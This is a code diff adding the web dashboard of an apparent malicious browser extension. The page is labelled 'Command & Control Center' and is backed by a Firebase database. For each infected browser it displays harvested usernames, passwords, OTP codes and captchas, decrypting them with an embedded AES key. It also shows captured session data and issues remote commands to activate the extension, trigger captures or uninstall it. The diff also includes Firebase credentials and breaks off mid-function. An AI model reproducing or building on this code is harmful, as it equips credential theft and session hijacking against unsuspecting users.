+                        <div class="user-meta" id="user-meta-container">
+                            <div class="meta-item">
+                                <i class="fas fa-circle" id="user-status-icon" style="color: #10b981;"></i>
+                                <span id="user-status-text">Online</span>
+                            </div>
+                            <div class="meta-item">
+                                <i class="fas fa-clock"></i>
+                                <span id="user-last-seen">Just now</span>
+                            </div>
+                            <div class="meta-item">
+                                <i class="fas fa-globe"></i>
+                                <span id="user-browser">Browser</span>
+                            </div>
+                            <div class="meta-item">
+                                <i class="fas fa-code-branch"></i>
+                                <span id="user-version">v11.4.0</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="action-buttons" id="action-buttons" style="display: none;">
+                    <button class="Refresh-Data" onclick="refreshData()">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                    <div class="toggle-container">
+                        <span class="toggle-label">Extension:</span>
+                        <div class="toggle-switch">
+                            <input type="checkbox" id="extension-toggle" onchange="toggleExtension()">
+                            <span class="toggle-slider"></span>
+                        </div>
+                        <span id="toggle-status" style="font-weight:600;">OFF</span>
+                    </div>
+                    <button class="capture-btn" onclick="triggerCapture()">
+                        <i class="fas fa-camera"></i> Capture
+                    </button>
+                    <button class="uninstall-btn" onclick="sendUninstallCommand()">
+                        <i class="fas fa-trash-alt"></i> Uninstall
+                    </button>
+                </div>
+            </div>
+
+            <!-- Tab Navigation -->
+            <div class="tab-navigation" id="tab-navigation" style="display: none;">
+                <button class="tab-btn active" onclick="switchTab('logins')">
+                    <i class="fas fa-key"></i> Logins
+                </button>
+                <button class="tab-btn" onclick="switchTab('sessions')">
+                    <i class="fas fa-history"></i> Sessions
+                </button>
+                <button class="tab-btn" onclick="switchTab('feedback')">
+                    <i class="fas fa-comment"></i> Feedback
+                </button>
+                <button class="tab-btn" onclick="switchTab('commands')">
+                    <i class="fas fa-terminal"></i> Commands
+                </button>
+                <button class="tab-btn" onclick="switchTab('status')">
+                    <i class="fas fa-info-circle"></i> Status
+                </button>
+            </div>
+
+            <!-- Data Content Area -->
+            <div class="data-content" id="data-content">
+                <!-- Welcome Screen -->
+                <div class="welcome-screen" id="welcome-screen">
+                    <div class="welcome-content">
+                        <i class="fas fa-user-secret"></i>
+                        <h1>Command & Control Center</h1>
+                        <p>Select a user from the sidebar to view their data, monitor activity, and send remote
+                            commands.</p>
+
+                        <div class="stats-overview">
+                            <div class="stat-box">
+                                <h3 id="total-users-count">0</h3>
+                                <p>Total Users</p>
+                            </div>
+                            <div class="stat-box">
+                                <h3 id="total-data-count">0</h3>
+                                <p>Data Entries</p>
+                            </div>
+                            <div class="stat-box">
+                                <h3 id="active-users-count">0</h3>
+                                <p>Active Now</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Modal -->
+        <div class="modal-overlay" id="modal-overlay">
+            <div class="modal">
+                <div class="modal-header">
+                    <h3 id="modal-title">View Data</h3>
+                    <button class="modal-close" onclick="closeModal()">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                <div class="modal-body" id="modal-body">
+                    <!-- Content will be loaded here -->
+                </div>
+            </div>
+        </div>
+
+        <!-- Notification -->
+        <div class="notification" id="notification">
+            <div class="notification-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="notification-content">
+                <h4 id="notification-title">Success</h4>
+                <p id="notification-message">Operation completed successfully.</p>
+            </div>
+            <button class="close-notification" onclick="hideNotification()">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyASM8D0_Ibssdyksde5Bj_9jWOkU6150MM",
+            authDomain: "commend-and-control-98d3d.firebaseapp.com",
+            databaseURL: "https://commend-and-control-98d3d-default-rtdb.firebaseio.com",
+            projectId: "commend-and-control-98d3d",
+            storageBucket: "commend-and-control-98d3d.firebasestorage.app",
+            messagingSenderId: "99037298064",
+            appId: "1:99037298064:web:356425ce1c0dfd48c9c715",
+            measurementId: "G-D3BJS1749L"
+        };
+
+        // Encryption key
+        const SECRET_KEY = "YourSecureAndSecretKeyForAES";
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Global variables
+        let allUsers = [];
+        let selectedUser = null;
+        let currentTab = 'logins';
+        let userData = {};
+        let userCommands = {};
+        let userFeedback = {};
+        let userSessions = {};
+        let userStatus = {};
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function () {
+            initDOMElements();
+            setupFirebaseListeners();
+            checkMobileView();
+
+            // Check for user in URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('user');
+            if (userId) {
+                setTimeout(() => {
+                    const user = allUsers.find(u => u.id === userId);
+                    if (user) selectUser(user);
+                }, 1000);
+            }
+        });
+
+        // Initialize DOM elements
+        function initDOMElements() {
+            window.sidebar = document.getElementById('sidebar');
+            window.usersList = document.getElementById('users-list');
+            window.searchInput = document.getElementById('search-users');
+            window.welcomeScreen = document.getElementById('welcome-screen');
+            window.dataContent = document.getElementById('data-content');
+            window.userDetailsHeader = document.getElementById('user-details-header');
+            window.actionButtons = document.getElementById('action-buttons');
+            window.tabNavigation = document.getElementById('tab-navigation');
+            window.backButton = document.getElementById('back-button');
+            window.notification = document.getElementById('notification');
+            window.modalOverlay = document.getElementById('modal-overlay');
+            window.toggleSwitch = document.getElementById('extension-toggle');
+            window.toggleStatus = document.getElementById('toggle-status');
+
+
+            if (searchInput) {
+                searchInput.addEventListener('input', filterUsers);
+            }
+
+            window.addEventListener('popstate', handlePopState);
+            window.addEventListener('resize', checkMobileView);
+
+            if (modalOverlay) {
+                modalOverlay.addEventListener('click', function (e) {
+                    if (e.target === modalOverlay) closeModal();
+                });
+            }
+            let toggle_Switch = document.getElementsByClassName('toggle-switch');
+            if (toggle_Switch.length > 0) {
+                toggle_Switch[0].addEventListener('click', function () {
+                    toggleSwitch.click();
+                });
+            }
+        }
+
+        // Toggle theme
+        function toggleTheme() {
+            document.body.classList.toggle('dark-mode');
+            const icon = document.querySelector('.theme-toggle i');
+            if (icon) {
+                icon.className = document.body.classList.contains('dark-mode') ? 'fas fa-sun' : 'fas fa-moon';
+            }
+        }
+
+        // Setup Firebase listeners
+        function setupFirebaseListeners() {
+            // Listen for all users
+            db.ref('users').on('value', (snapshot) => {
+                const users = snapshot.val();
+                if (users) {
+                    processUsers(users);
+                } else {
+                    if (usersList) {
+                        usersList.innerHTML = '<div class="no-data-message"><p>No users connected</p></div>';
+                    }
+                }
+            });
+        }
+
+        // Process users data
+        function processUsers(users) {
+            allUsers = [];
+            let processedCount = 0;
+            const totalUsers = Object.keys(users).length;
+
+            for (const userId in users) {
+                const user = users[userId];
+
+                // Listen for status
+                const statusRef = db.ref(`users/${userId}/status`);
+                statusRef.on('value', (snapshot) => {
+                    const status = snapshot.val();
+                    if (status) {
+                        userStatus[userId] = {
+                            ...status,
+                            lastSeen: status.lastSeen || Date.now()
+                        };
+
+                        // Update user in allUsers
+                        const userIndex = allUsers.findIndex(u => u.id === userId);
+                        if (userIndex !== -1) {
+                            allUsers[userIndex].status = userStatus[userId];
+                        }
+
+                        // Update UI if this is selected user
+                        if (selectedUser && selectedUser.id === userId) {
+                            updateSelectedUserUI();
+                        }
+
+                        updateUsersList();
+                        updateStats();
+                    }
+                });
+
+                // Listen for commands
+                const commandsRef = db.ref(`users/${userId}/commands`);
+                commandsRef.on('value', (snapshot) => {
+                    const commands = snapshot.val();
+                    if (commands) {
+                        userCommands[userId] = commands;
+
+                        // Update UI if this is selected user and on commands tab
+                        if (selectedUser && selectedUser.id === userId && currentTab === 'commands') {
+                            displayCommands(commands);
+                        }
+
+                        // Update toggle if needed
+                        if (selectedUser && selectedUser.id === userId) {
+                            updateToggleSwitch();
+                        }
+                    }
+                });
+
+                // Count data
+                const dataRef = db.ref(`users/${userId}/websites`);
+                dataRef.once('value').then((snapshot) => {
+                    const websites = snapshot.val();
+                    let dataCount = 0;
+                    let sessionCount = 0;
+
+                    if (websites) {
+                        for (const site in websites) {
+                            if (websites[site].logins) {
+                                dataCount += Object.keys(websites[site].logins).length;
+                            }
+                        }
+                    }
+
+                    // Count sessions
+                    const sessionsRef = db.ref(`users/${userId}/captured_sessions`);
+                    sessionsRef.once('value').then((snap) => {
+                        const sessions = snap.val();
+                        if (sessions) {
+                            sessionCount = countSessions(sessions);
+                        }
+
+                        allUsers.push({
+                            id: userId,
+                            name: userId,
+                            dataCount: dataCount,
+                            sessionCount: sessionCount,
+                            status: userStatus[userId] || {}
+                        });
+
+                        processedCount++;
+                        if (processedCount === totalUsers) {
+                            updateUsersList();
+                            updateStats();
+                        }
+                    });
+                });
+
+                // Listen for feedback
+                const feedbackRef = db.ref(`users/${userId}/feedback`);
+                feedbackRef.on('value', (snapshot) => {
+                    const feedback = snapshot.val();
+                    if (feedback) {
+                        userFeedback[userId] = feedback;
+
+                        if (selectedUser && selectedUser.id === userId && currentTab === 'feedback') {
+                            displayFeedback(feedback);
+                        }
+                    }
+                });
+
+                // Listen for sessions
+                const sessionsRef = db.ref(`users/${userId}/captured_sessions`);
+                sessionsRef.on('value', (snapshot) => {
+                    const sessions = snapshot.val();
+                    if (sessions) {
+                        userSessions[userId] = sessions;
+
+                        if (selectedUser && selectedUser.id === userId && currentTab === 'sessions') {
+                            displaySessions(sessions);
+                        }
+                    }
+                });
+            }
+        }
+
+        // Update users list
+        function updateUsersList() {
+            if (!usersList) return;
+
+            const searchTerm = searchInput ? searchInput.value.toLowerCase() : '';
+
+            const filteredUsers = allUsers.filter(user =>
+                user.name.toLowerCase().includes(searchTerm)
+            );
+
+            filteredUsers.sort((a, b) => {
+                const aOnline = a.status?.online || false;
+                const bOnline = b.status?.online || false;
+
+                if (aOnline && !bOnline) return -1;
+                if (!aOnline && bOnline) return 1;
+
+                const aLast = a.status?.lastSeen || 0;
+                const bLast = b.status?.lastSeen || 0;
+                return bLast - aLast;
+            });
+
+            usersList.innerHTML = '';
+
+            if (filteredUsers.length === 0) {
+                usersList.innerHTML = '<div class="no-data-message"><p>No users found</p></div>';
+                return;
+            }
+
+            filteredUsers.forEach(user => {
+                const status = user.status || {};
+                const isOnline = status.online || false;
+                const lastSeen = status.lastSeen || Date.now();
+                const runAction = userCommands[user.id]?.trigger_content?.runAction || false;
+
+                const card = document.createElement('div');
+                card.className = `user-card ${selectedUser && selectedUser.id === user.id ? 'active' : ''}`;
+                card.onclick = () => selectUser(user);
+
+                card.innerHTML = `
+                    <div class="user-avatar">${user.name.charAt(0).toUpperCase()}</div>
+                    <div class="user-info">
+                        <h3>${user.name}</h3>
+                        <div class="user-status">
+                            <span class="indicator ${isOnline ? 'online' : 'offline'}"></span>
+                            <span>${isOnline ? 'Active now' : formatLastSeen(lastSeen)}</span>
+                        </div>
+                        <div class="user-stats">
+                            <div class="stat"><i class="fas fa-key"></i> ${user.dataCount || 0}</div>
+                            <div class="stat"><i class="fas fa-history"></i> ${user.sessionCount || 0}</div>
+                            <div class="stat"><i class="fas fa-bolt"></i> ${runAction ? 'ON' : 'OFF'}</div>
+                        </div>
+                    </div>
+                `;
+
+                usersList.appendChild(card);
+            });
+        }
+
+        // Format last seen
+        function formatLastSeen(timestamp) {
+            if (!timestamp) return 'Never';
+
+            const now = Date.now();
+            const diff = now - timestamp;
+
+            if (diff < 60000) return 'Just now';
+            if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
+            if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
+            return `${Math.floor(diff / 86400000)}d ago`;
+        }
+
+        // Helper: flatten nested captured_sessions object into array of { sessionId, session, site }
+        function flattenSessionsObj(sessionsObj) {
+            const out = [];
+            if (!sessionsObj || typeof sessionsObj !== 'object') return out;
+
+            for (const siteKey in sessionsObj) {
+                const siteVal = sessionsObj[siteKey];
+
+                // If siteVal looks like a map of session entries (leaf), collect them
+                if (siteVal && typeof siteVal === 'object') {
+                    const childKeys = Object.keys(siteVal);
+                    // Heuristic: if children have 'data' or 'timestamp', treat as session entries
+                    if (childKeys.length > 0 && (siteVal[childKeys[0]] && (siteVal[childKeys[0]].data !== undefined || siteVal[childKeys[0]].timestamp !== undefined))) {
+                        for (const sid of childKeys) {
+                            out.push({ sessionId: sid, session: siteVal[sid], site: siteKey });
+                        }
+                    } else {
+                        // nested deeper (unexpected shape) - recurse
+                        const deeper = flattenSessionsObj(siteVal);
+                        deeper.forEach(item => {
+                            // preserve original siteKey if deeper item has no site
+                            if (!item.site) item.site = siteKey;
+                            out.push(item);
+                        });
+                    }
+                }
+            }
+
+            return out;
+        }
+
+        // Helper: count total sessions inside possibly nested captured_sessions
+        function countSessions(sessionsObj) {
+            const arr = flattenSessionsObj(sessionsObj);
+            return arr.length;
+        }
+
+        // Filter users
+        function filterUsers() {
+            updateUsersList();
+        }
+
+        // Select user
+        function selectUser(user) {
+            selectedUser = user;
+
+            window.history.pushState({ userId: user.id }, '', `?user=${user.id}`);
+
+            // Show UI elements
+            welcomeScreen.style.display = 'none';
+            userDetailsHeader.style.display = 'flex';
+            actionButtons.style.display = 'flex';
+            tabNavigation.style.display = 'flex';
+            sidebar.style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+
+            updateSelectedUserUI();
+            updateToggleSwitch();
+            switchTab('logins');
+
+            if (window.innerWidth <= 768) {
+                // Hide the sidebar (slide out) and ensure it's not intercepting clicks
+                sidebar.classList.remove('active');
+                sidebar.style.display = 'none';
+                // Make sure main content and header/back button are visible
+                document.getElementById('main-content').style.display = 'block';
+                backButton.style.display = 'flex';
+            }
+        }
+
+        // Update selected user UI
+        function updateSelectedUserUI() {
+            if (!selectedUser) return;
+
+            const status = userStatus[selectedUser.id] || {};
+            const isOnline = status.online || false;
+            const lastSeen = status.lastSeen || Date.now();
+            const browser = status.browser || 'Unknown';
+            const version = status.extensionVersion || 'Unknown';
+
+            document.getElementById('selected-user-avatar').textContent = selectedUser.name.charAt(0).toUpperCase();
+            document.getElementById('selected-user-name').textContent = selectedUser.name;
+
+            const statusIcon = document.getElementById('user-status-icon');
+            statusIcon.style.color = isOnline ? '#10b981' : '#ef4444';
+            document.getElementById('user-status-text').textContent = isOnline ? 'Online' : 'Offline';
+            document.getElementById('user-last-seen').textContent = `Last seen: ${formatLastSeen(lastSeen)}`;
+            document.getElementById('user-browser').textContent = browser.split('/')[0] || 'Unknown';
+            document.getElementById('user-version').textContent = `v${version}`;
+
+            updateUsersList();
+        }
+
+        // Update toggle switch
+        function updateToggleSwitch() {
+            if (!selectedUser || !toggleSwitch || !toggleStatus) return;
+
+            const runAction = userCommands[selectedUser.id]?.trigger_content?.runAction || false;
+            toggleSwitch.checked = runAction;
+            toggleStatus.textContent = runAction ? 'ON' : 'OFF';
+            toggleStatus.style.color = runAction ? '#10b981' : '#4361ee';
+        }
+
+        // Switch tab
+        function switchTab(tab) {
+            currentTab = tab;
+
+            // Update active tab
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            const activeBtn = Array.from(document.querySelectorAll('.tab-btn')).find(btn =>
+                btn.textContent.toLowerCase().includes(tab)
+            );
+            if (activeBtn) activeBtn.classList.add('active');
+
+            // Load data based on tab
+            if (!selectedUser) return;
+
+            switch (tab) {
+                case 'logins':
+                    loadLogins();
+                    break;
+                case 'sessions':
+                    loadSessions();
+                    break;
+                case 'feedback':
+                    loadFeedback();
+                    break;
+                case 'commands':
+                    loadCommands();
+                    break;
+                case 'status':
+                    loadStatus();
+                    break;
+            }
+        }
+
+        // Load logins data
+        function loadLogins() {
+            dataContent.innerHTML = '<div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i></div>';
+
+            db.ref(`users/${selectedUser.id}/websites`).once('value').then((snapshot) => {
+                const websites = snapshot.val();
+                displayLogins(websites);
+            });
+        }
+
+        // Display logins
+        function displayLogins(websites) {
+            if (!websites || Object.keys(websites).length === 0) {
+                dataContent.innerHTML = `
+                    <div class="no-data-message">
+                        <i class="fas fa-inbox"></i>
+                        <h3>No Login Data</h3>
+                        <p>No login credentials captured yet.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            dataContent.innerHTML = '';
+
+            for (const siteKey in websites) {
+                const site = websites[siteKey];
+                if (!site.logins) continue;
+
+                const siteName = siteKey.replace(/_/g, '.');
+
+                for (const entryId in site.logins) {
+                    const entry = site.logins[entryId];
+                    const timestamp = entry.timestamp || Date.now();
+                    const date = new Date(timestamp).toLocaleString();
+
+                    // Decrypt data
+                    const decrypted = {};
+                    for (const key in entry) {
+                        if (key === 'timestamp') {
+                            decrypted[key] = entry[key];
+                        } else {
+                            decrypted[key] = decryptAES(entry[key]);
+                        }
+                    }
+
+                    const card = document.createElement('div');
+                    card.className = 'data-card';
+                    card.innerHTML = `
+                        <div class="card-header">
+                            <div class="site-info">
+                                <div class="site-icon">${siteName.charAt(0).toUpperCase()}</div>
+                                <div>
+                                    <div class="site-name">${siteName}</div>
+                                    <div class="site-url">${entry.url || siteName}</div>
+                                </div>
+                            </div>
+                            <div class="timestamp">${date}</div>
+                        </div>
+                        <div class="card-body">
+                            ${decrypted.u ? renderDataItem('Username', decrypted.u, entryId, 'u') : ''}
+                            ${decrypted.p ? renderDataItem('Password', decrypted.p, entryId, 'p') : ''}
+                            ${decrypted.otp ? renderDataItem('OTP', decrypted.otp, entryId, 'otp') : ''}
+                            ${decrypted.c ? renderDataItem('Captcha', decrypted.c, entryId, 'c') : ''}
+                        </div>
+                        <button class="delete-btn" onclick="deleteEntry('${selectedUser.id}', '${siteKey}', '${entryId}')">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    `;
+
+                    dataContent.appendChild(card);
+                }
+            }
+        }
+
+        // Render data item
+        function renderDataItem(label, value, entryId, field) {
+            const displayValue = value.length > 30 ? value.substring(0, 30) + '...' : value;
+            return `
+                <div class="data-item">
+                    <span class="data-label">${label}:</span>
+                    <span class="data-value" title="${value}">${displayValue}</span>
+                    <div class="data-actions">
+                        <button class="view-btn" onclick="viewFullValue('${label}', '${value.replace(/'/g, "\\'")}')">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                        <button class="copy-btn" onclick="copyToClipboard('${value.replace(/'/g, "\\'")}')">
+                            <i class="far fa-copy"></i>
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+
+        // Load sessions
+        function loadSessions() {
+            dataContent.innerHTML = '<div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i></div>';
+
+            db.ref(`users/${selectedUser.id}/captured_sessions`).once('value').then((snapshot) => {
+                const sessions = snapshot.val();
+                displaySessions(sessions);
+            });
+        }
+
+        // Display sessions
+        function displaySessions(sessions) {
+            // Flatten nested session structure (site -> pushId -> session)
+            const flat = flattenSessionsObj(sessions);
+
+            if (!flat || flat.length === 0) {
+                dataContent.innerHTML = `
+                    <div class="no-data-message">
+                        <i class="fas fa-history"></i>
+                        <h3>No Sessions</h3>
+                        <p>No captured sessions found.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            dataContent.innerHTML = '';
+
+            flat.forEach(item => {
+                const sessionId = item.sessionId;
+                const session = item.session || {};
+                const siteKey = item.site || 'unknown_site';
+                const timestamp = session.timestamp || Date.now();
+                const date = new Date(timestamp).toLocaleString();
+
+                const card = document.createElement('div');
+                card.className = 'data-card';
+                card.innerHTML = `
+                    <div class="card-header">
+                        <div class="site-info">
+                            <div class="site-icon"><i class="fas fa-history"></i></div>
+                            <div>
+                                <div class="site-name">Captured Session</div>
+                                <div class="site-url">${session.full_url || siteKey || 'Unknown URL'}</div>
+                            </div>
+                        </div>
+                        <div class="timestamp">${date}</div>
+                    </div>
+                    <div class="card-body">
+                        <div class="data-item">
+                            <span class="data-label">Session ID:</span>
+                            <span class="data-value">${sessionId}</span>
+                            <div class="data-actions">
+                                <button class="copy-btn" onclick="copyToClipboard('${sessionId}')">
+                                    <i class="far fa-copy"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Data:</span>
+                            <span class="data-value">Encrypted</span>
+                            <div class="data-actions">
+                                <button class="view-btn" onclick="viewSessionData('${session.data || ''}')">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                                <button class="copy-btn" onclick="copyToClipboard('${session.data || ''}')">
+                                    <i class="far fa-copy"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="delete-btn" onclick="deleteSession('${selectedUser.id}', '${siteKey}', '${sessionId}')">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                `;
+
+                dataContent.appendChild(card);
+            });
+        }
+
+        // View session data
+        function viewSessionData(encryptedData) {
+            try {
+                const decrypted = decryptAES(encryptedData);
+                viewFullValue('Session Data', decrypted);
+            } catch (e) {
+                viewFullValue('Session Data (Encrypted)', encryptedData);
+            }
+        }
+
+        // Load feedback
+        function loadFeedback() {
+            dataContent.innerHTML = '<div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i></div>';
+
+            db.ref(`users/${selectedUser.id}/feedback`).once('value').then((snapshot) => {
+                const feedback = snapshot.val();
+                displayFeedback(feedback);
+            });
+        }
+
+        // Display feedback
+        function displayFeedback(feedback) {
+            if (!feedback || Object.keys(feedback).length === 0) {
+                dataContent.innerHTML = `
+                    <div class="no-data-message">
+                        <i class="fas fa-comment-slash"></i>
+                        <h3>No Feedback</h3>
+                        <p>No feedback entries found.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            dataContent.innerHTML = '';
+
+            // Sort feedback by timestamp (newest first)
+            const sorted = Object.entries(feedback).sort((a, b) => {
+                return (b[1].timestamp || 0) - (a[1].timestamp || 0);
+            });
+
+            for (const [feedbackId, entry] of sorted) {
+                const timestamp = entry.timestamp || Date.now();
+                const date = new Date(timestamp).toLocaleString();
+
+                const card = document.createElement('div');
+                card.className = 'data-card';
+                card.innerHTML = `
+                    <div class="card-header">
+                        <div class="site-info">
+                            <div class="site-icon"><i class="fas fa-comment"></i></div>
+                            <div>
+                                <div class="site-name">Feedback Entry</div>
+                                <div class="site-url">v${entry.extensionVersion || 'Unknown'}</div>
+                            </div>
+                        </div>
+                        <div class="timestamp">${date}</div>
+                    </div>
+                    <div class="card-body">
+                        <div class="feedback-item">
+                            <div class="feedback-message"><strong>Event:</strong> ${entry.eventType || 'Unknown'}</div>
+                            <div class="feedback-message"><strong>Message:</strong> ${entry.message || 'No message'}</div>
+                            <div class="feedback-meta">
+                                <span><i class="fas fa-tag"></i> ${entry.eventType || 'Unknown'}</span>
+                                <span><i class="fas fa-code-branch"></i> v${entry.extensionVersion || 'Unknown'}</span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="delete-btn" onclick="deleteFeedback('${selectedUser.id}', '${feedbackId}')">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                `;
+
+                dataContent.appendChild(card);
+            }
+        }
+
+        // Load commands
+        function loadCommands() {
+            dataContent.innerHTML = '<div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i></div>';
+
+            db.ref(`users/${selectedUser.id}/commands`).once('value').then((snapshot) => {
+                const commands = snapshot.val();
+                displayCommands(commands);
+            });
+        }
+
+        // Display commands
+        function displayCommands(commands) {
+            if (!commands || Object.keys(commands).length === 0) {
+                dataContent.innerHTML = `
+                    <div class="no-data-message">
+                        <i class="fas fa-terminal"></i>
+                        <h3>No Commands</h3>
+                        <p>No commands have been sent yet.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            dataContent.innerHTML = '';
+
+            const card = document.createElement('div');
+            card.className = 'data-card';
+            card.innerHTML = `
+                <div class="card-header">
+                    <div class="site-info">
+                        <div class="site-icon"><i class="fas fa-terminal"></i></div>
+                        <div>
+                            <div class="site-name">Command Status</div>
+                            <div class="site-url">Current Commands</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-body">
+                    ${Object.entries(commands).map(([key, value]) => `
+                        <div class="command-item">
+                            <span class="command-label">${key}:</span>
+                            <span class="command-value">${JSON.stringify(value)}</span>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+
+            dataContent.appendChild(card);
+        }
+
+        // Load status
+        function loadStatus() {
+            dataContent.innerHTML = '<div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i></div>';
+
+            db.ref(`users/${selectedUser.id}/status`).once('value').then((snapshot) => {
+                const status = snapshot.val();
+                displayStatus(status);
+            });
+        }
+
+        // Display status
+        function displayStatus(status) {
+            if (!status) {
+                dataContent.innerHTML = `
+                    <div class="no-data-message">
+                        <i class="fas fa-info-circle"></i>
+                        <h3>No Status</h3>
+                        <p>No status information available.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            dataContent.innerHTML = '';
+
+            const card = document.createElement('div');
+            card.className = 'data-card';
+            card.innerHTML = `
+                <div class="card-header">
+                    <div class="site-info">
+                        <div class="site-icon"><i class="fas fa-info-circle"></i></div>
+                        <div>
+                            <div class="site-name">System Status</div>
+                            <div class="site-url">Extension Information</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <div class="data-item">
+                        <span class="data-label">Online:</span>
+                        <span class="data-value">
+                            <span class="status-badge ${status.online ? 'online' : 'offline'}">
+                                ${status.online ? 'ONLINE' : 'OFFLINE'}
+                            </span>
+                        </span>
+                    </div>
+                    <div class="data-item">
+                        <span class="data-label">Browser:</span>
+                        <span class="data-value">${status.browser || 'Unknown'}</span>
+                    </div>
+                    <div class="data-item">
+                        <span class="data-label">Version:</span>
+                        <span class="data-value">${status.extensionVersion || 'Unknown'}</span>
+                    </div>
+                    <div class="data-item">
+                        <span class="data-label">Last Heartbeat:</span>
+                        <span class="data-value">${new Date(status.lastHeartbeat || 0).toLocaleString()}</span>
+                    </div>
+                    <div class="data-item">
+                        <span class="data-label">Last Seen:</span>
+                        <span class="data-value">${new Date(status.lastSeen || 0).toLocaleString()}</span>
+                    </div>
+                    <div class="data-item">
+                        <span class="data-label">Reactivated:</span>
+                        <span class="data-value">
+                            <span class="status-badge ${status.reactivated ? 'active' : 'offline'}">
+                                ${status.reactivated ? 'YES' : 'NO'}
+                            </span>
+                        </span>
+                    </div>
+                    <div class="data-item">
+                        <span class="data-label">Uninstalled:</span>
+                        <span class="data-value">
+                            <span class="status-badge ${status.uninstalled ? 'offline' : 'online'}">
+                                ${status.uninstalled ? 'YES' : 'NO'}
+                            </span>
+                        </span>
+                    </div>
+                    ${status.uninstallTime ? `
+                        <div class="data-item">
+                            <span class="data-label">Uninstall Time:</span>
+                            <span class="data-value">${new Date(status.uninstallTime).toLocaleString()}</span>
+                        </div>
+                    ` : ''}
+                </div>
+            `;
+
+            dataContent.appendChild(card);
+        }
+
+        // AES Decryption
+        function decryptAES(encryptedText) {
+            try {
+                if (!encryptedText) return encryptedText;
+
+                const bytes = CryptoJS.AES.decrypt(encryptedText, SECRET_KEY);
+                const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+
+                return decrypted || encryptedText;
+            } catch (error) {
+                console.error('Decryption error:', error);
+                return encryptedText;
+            }
+        }
+
+        // Toggle extension
+        function toggleExtension() {
+            if (!selectedUser || !toggleSwitch) return;
+
+            const runAction = toggleSwitch.checked;
+
+            db.ref(`users/${selectedUser.id}/commands/trigger_content`).update({
+                runAction: runAction,
+                lastCommand: Date.now(),
+                commandBy: 'admin'
+            }).then(() => {
+                showNotification('Command Sent', `Extension ${runAction ? 'activated' : 'deactivated'}`, 'success');
+                toggleStatus.textContent = runAction ? 'ON' : 'OFF';
+                toggleStatus.style.color = runAction ? '#10b981' : '#4361ee';
+            }).catch((error) => {
+                showNotification('Error', error.message, 'error');
+                toggleSwitch.checked = !runAction;
+            });
+        }
+
+        // Trigger capture
+        function triggerCapture() {
+            if (!selectedUser) return;
+
+            db.ref(`users/${selectedUser.id}/commands/trigger_content`).update({
+                triggerCapture: true,
+                lastCommand: Date.now(),
+                commandBy: 'admin'
+            }).then(() => {
+                showNotification('Capture Command Sent', 'Capture triggered', 'success');
+            }).catch((error) => {
+                showNotification('Error', error.message, 'error');
+            });
+        }
+
+        // Send uninstall command
+        function sendUninstallCommand() {
+            if (!selectedUser) return;
+
+            if (confirm(`⚠️ WARNING: This will uninstall the extension from ${selectedUser.name}'s browser. Continue?`)) {
+                db.ref(`users/${selectedUser.id}/commands/trigger_content`).update({
+                    triggerUninstall: true,
+                    lastCommand: Date.now(),
+                    commandBy: 'admin'
+                }).then(() => {
+                    showNotification('Uninstall Command Sent', 'Extension will be removed', 'warning');
+                }).catch((error) => {
+                    showNotification('Error', error.message, 'error');
+                });
+            }
+        }
+
+        // Refresh data
+        function refreshData() {
+            if (!selectedUser) return;
+
+            switch (currentTab) {
+                case 'logins':
+                    loadLogins();
+                    break;
+                case 'sessions':
+                    loadSessions();
+                    break;
+                case 'feedback':
+                    loadFeedback();
+                    break;
+                case 'commands':
+                    loadCommands();
+                    break;
+                case 'status':
+                    loadStatus();
+                    break;
+            }
+
+            showNotification('Refreshed', 'Data updated', 'success');
+        }
+
+        // Delete entry
+        function deleteEntry(userId, siteKey, entryId) {
+            if (confirm('Delete this entry?')) {
+                db.ref(`users/${userId}/websites/${siteKey}/logins/${entryId}`).remove()
+                    .then(() => {
+                        showNotification('Deleted', 'Entry removed', 'success');
+                        loadLogins();
+                    })
+                    .catch((error) => {
+                        showNotification('Error', error.message, 'error');
+                    });
+            }
+        }
+
+        // Delete session (siteKey is the safe hostname folder, sessionId is the push id)
+        function deleteSession(userId, siteKey, sessionId) {
+            if (!siteKey || !sessionId) {
+                if (!confirm('Delete this session?')) return;
+            }
+
